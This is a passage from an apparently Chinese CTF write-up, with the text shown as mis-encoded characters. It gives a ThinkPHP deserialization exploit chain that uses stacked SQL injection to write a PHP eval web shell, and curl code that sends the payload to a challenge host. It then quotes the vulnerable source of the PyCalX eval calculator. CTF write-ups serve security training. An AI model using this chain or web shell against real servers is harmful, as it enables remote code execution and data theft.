&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// å †å æ³¨å…¥å†™å…¥shell
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ ~~ï¼ˆpostmanæ‰“é’±ï¼‰~~ä¸€å¥—è¿žæ‹›ç›´æŽ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿žæŽ¥ä¹‹åŽå‘çŽ°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
&lt;p>æˆ‘ä»¬è¿˜å¾—è¿žä¸Šæ•°æ®åº“çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
&lt;p>ä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æŽ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èŽçš„ðŸŽ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png" alt="image-20211219195808735">&lt;/p>
&lt;p>ç›´æŽ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">wp1&lt;/a> &lt;a href="http://www.yang99.top/index.php/archives/48/#easytp">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
PyCalX 1&amp;amp;2
&lt;/h4>
&lt;/summary>
&lt;p>é¦–å…ˆæ˜¯1&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cgi&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">html&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">escape&lt;/span>
&lt;span style="color:#111">FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">OK_200&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Content-type: text/html
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;center&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;form&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=value1 placeholder=&amp;#39;Value 1 (Example: 1 abc)&amp;#39; autofocus/&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=op placeholder=&amp;#39;Operator (Example: + - * ** / // == != )&amp;#39; /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=value2 placeholder=&amp;#39;Value 2 (Example: 1 abc)&amp;#39; /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4 btn btn-success&amp;#34; type=submit value=EVAL /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;/form&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;a href=&amp;#39;?source=1&amp;#39;&amp;gt;Source&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;/center&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">OK_200&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cgi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FieldStorage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;value1&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;value2&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;op&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">():&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;(&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;[&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># I don&amp;#39;t like tuple, list and dict.&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">[]:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">val&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_op&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">list_ops&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;+&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;-&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;!&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">list_ops&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">val&lt;/span>
&lt;span style="color:#111">op&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_op&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;op&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value1&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value2&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Types of the values don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t match&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">calc_eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
